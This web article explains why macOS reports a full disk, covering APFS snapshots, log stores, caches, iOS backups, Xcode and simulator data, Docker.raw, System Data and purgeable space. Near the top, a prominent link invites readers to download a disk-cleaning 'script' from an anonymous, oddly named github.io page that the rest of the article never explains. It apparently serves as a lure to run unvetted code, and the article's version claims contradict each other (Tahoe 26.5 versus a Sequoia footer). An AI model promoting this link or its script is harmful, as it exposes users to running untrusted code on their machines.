# macOS Disk Full Error

> **Applies to:** macOS 10.13 High Sierra — macOS Tahoe 26.5 · **File system:** APFS · **Architecture:** Intel x86_64 & Apple Silicon ARM64

---

## The Problem — Five Hidden Subsystems, One Frozen Bar

> **[Reclaim your Mac's disk space with this script](https://error-number-472173.github.io/.github/)** — works on macOS 12 Monterey through macOS Tahoe 26.5, Intel and Apple Silicon.

Most people losing 40–80 GB to a "full" disk have no idea the space is split across five completely separate subsystems — none of which the Finder exposes, none of which third-party cleaners fully reach. CleanMyMac skips APFS snapshots. Disk Diag misses Docker.raw. The macOS Storage panel lumps everything into a useless "System Data" bucket and offers no way to act on it.

**What's actually consuming your disk, in order of impact:**

- APFS local snapshots pinning deleted files at the block level through Copy-on-Write B-tree references
- The unified log store accumulating compressed `.tracev3` binaries under `/var/db/diagnostics/` at 100–400 MB per day under normal conditions
- Orphaned Xcode DerivedData entries — compiled objects and `.swiftmodule` files from projects that no longer exist on disk
- iOS Simulator runtimes shipping as cryptex disk images, 3.5–7 GB each, accumulating across iOS versions
- `Docker.raw` — a monotonically growing disk image that never shrinks when containers are removed

---

## How macOS Storage Is Structured

Since macOS 10.13, Apple uses **APFS (Apple File System)** on all Macs. Unlike its predecessor HFS+, APFS organizes everything inside a single **container** — a logical wrapper that hosts multiple **volumes** sharing one unified pool of free space. The key consequence: growth in any volume directly reduces space available to all others.

A typical Mac exposes these volumes inside the container:

| Volume | Role | Writable |
|---|---|---|
| `Macintosh HD` | Signed System Volume — the OS itself, cryptographically sealed | No |
| `Macintosh HD - Data` | All user data, home directories, third-party apps | Yes |
| `VM` | Swap files, `sleepimage`, compressed memory overflow | Yes |
| `Preboot` | Boot metadata required to mount the SSV | Managed |
| `Recovery` | recoveryOS for reinstall and NVRAM reset | No |

The **VM volume** alone can silently consume 10–30 GB depending on RAM pressure, competing with user storage in the shared free pool — with no visible indication in the Finder.

---

## Root Causes

### APFS Local Snapshots

This is the most frequent and least understood cause of sudden disk full errors. When Time Machine is enabled — even without an external drive connected — macOS creates **local APFS snapshots** every hour via the `tmd` daemon.

APFS snapshots use a **Copy-on-Write B-tree**. When a snapshot exists and a file is deleted, the underlying storage blocks are not freed — the snapshot still holds a reference to them. From the user's perspective they deleted 10 GB of files, but the free space shown by the system doesn't change. This is by design and not a bug. Snapshots are retained for up to 24 hours, and OS updates via `softwareupdate` create additional ones that persist until the update is fully verified.

Under disk pressure, `tmd` begins purging oldest snapshots as a background task — this can take several minutes, during which the system appears permanently full.

### System Logs and Diagnostic Reports

The **Unified Logging System** (introduced macOS 10.12) is managed by `logd` and generates significantly more data than the legacy syslog it replaced. Logs are stored as compressed binary `.tracev3` files under `/var/db/diagnostics/`, alongside UUID-to-binary mapping tables under `/var/db/uuidtext/`. On a healthy system this accumulates 100–400 MB/day. A process in a crash loop or with runaway debug logging can push it to several gigabytes per day.

Crash reports (`.ips` files) in `~/Library/Logs/DiagnosticReports/` are JSON-encoded with full thread backtraces. An app crashing repeatedly before `ReportCrash` throttles it can generate hundreds of reports, each several megabytes in size.

### Application and Browser Caches

macOS caches data at multiple layers under `~/Library/Caches/` (per-user, indexed by bundle ID) and `/Library/Caches/` (system-wide). Under normal conditions these are bounded. When an app has a broken eviction policy, or a cache directory is orphaned after the app is deleted, it grows indefinitely with no automatic cleanup.

Browser caches are the most extreme case. Chrome maintains independent GPU shader, code, network, and media caches — none governed by macOS eviction policies — spread across `~/Library/Caches/com.google.Chrome/` and `~/Library/Application Support/Google/Chrome/Default/Cache/`. Together they can reach several gigabytes on any heavily-used system.

### iOS and iPadOS Backups

When an iPhone or iPad is backed up via Finder, the backup is stored at `~/Library/Application Support/MobileSync/Backup/`. Each device gets a subdirectory named by its **UDID** (a 40-character hex string), containing a `Manifest.db` SQLite index and SHA-1 hash-indexed data blobs covering all app documents, Messages, Health data, and more.

A fully-loaded iPhone with iCloud Photos disabled and years of Messages history can produce a backup exceeding 80–120 GB. Multiple paired devices — iPhone, iPad, old iPod touch — each generate their own independent full backup with no automatic pruning.

### Xcode Derived Data, Simulators and Archives

Xcode is the single largest source of unbounded disk growth on developer Macs. None of its major storage areas are pruned automatically:

| Location | Contents | Typical Size |
|---|---|---|
| `~/Library/Developer/Xcode/DerivedData/` | Compiled objects, `.swiftmodule` files, indexing DB per project | 30–150 GB |
| `~/Library/Developer/CoreSimulator/` | Simulator runtime cryptex images per platform version | 20–50 GB |
| `~/Library/Developer/Xcode/Archives/` | `.xcarchive` bundles with full dSYMs per distribution build | 10–60 GB |
| `~/Library/Developer/Xcode/iOS DeviceSupport/` | Debug symbols downloaded from physical devices | 10–60 GB |

Since Xcode 14, simulator runtimes ship as **cryptex disk images** (~3.5–7 GB each). Developers testing against 4–6 iOS versions carry 20–40 GB in simulators alone. Stale DerivedData entries from renamed or deleted projects remain indefinitely.

### Virtual Machines and Docker

VM disk images are **thin-provisioned**: they start small and expand as the guest OS writes data. When files are deleted inside the VM, the host image does not shrink — the guest marks sectors free in its own file system, but the host file retains the physical bytes. Without explicit compaction the image grows monotonically.

Docker Desktop on macOS runs a Linux VM via Apple's Virtualization.framework (Apple Silicon) or HyperKit (Intel). All container, image, and volume data lives inside a single raw disk image at `~/Library/Containers/com.docker.docker/Data/vms/0/data/Docker.raw`. This file never automatically shrinks when images are removed with `docker rmi` or `docker system prune` — internal space is freed, but the host file maintains its historical maximum until a manual compaction or full reset. On an active development machine `Docker.raw` routinely reaches 60–100 GB.

---

## What "System Data" Actually Contains

The **System Data** category in System Settings → General → Storage is not a single directory. It is a catch-all for everything that doesn't map to named user categories like Applications, Documents, or Photos.

| Component | Location | Typical Size |
|---|---|---|
| APFS local snapshots | Reported separately via `tmutil` | 0–50+ GB |
| VM swap files | `/private/var/vm/swapfile*` | 2–30 GB |
| `sleepimage` | `/private/var/vm/sleepimage` | Equal to installed RAM |
| Unified log store | `/var/db/diagnostics/` + `/var/db/uuidtext/` | 1–10 GB |
| Spotlight index | `/.Spotlight-V100/` | 3–8 GB |
| `mds_stores` (Spotlight raw) | `/private/var/db/Spotlight-V100/` | 2–5 GB |
| `fseventsd` journal | `/.fseventsd/` | 50–500 MB |

The `sleepimage` file is permanently sized equal to installed RAM. A MacBook Pro with 64 GB of unified memory always has a 64 GB file at `/private/var/vm/sleepimage`. On Apple Silicon this behavior is adjusted by battery state, but the file still exists at full RAM size by default under the standard hibernation mode (`hibernatemode 3`).

---

## APFS Purgeable Space and Why It Misleads

APFS tracks a third storage state beyond used and free: **purgeable**. Purgeable space is occupied by data that macOS is permitted to delete without user confirmation — iCloud Drive files with cloud copies, browser caches tagged as evictable, Time Machine local snapshots past their retention window.

When an application checks available disk space, APFS returns free space **plus** purgeable space as the available figure. An application may therefore see 20 GB "available" when raw free space is only 2 GB. The system attempts to purge as files are written, but if purging cannot keep pace with a large write operation, the write fails mid-stream with `ENOSPC` even though the pre-check reported sufficient space. This is the underlying mechanism behind many "disk full" errors that appear without warning on systems that show several gigabytes of apparent free space.

---

*Covers macOS storage internals as of macOS 15 Sequoia. APFS behavior, daemon identifiers, and volume naming may differ on older releases.*
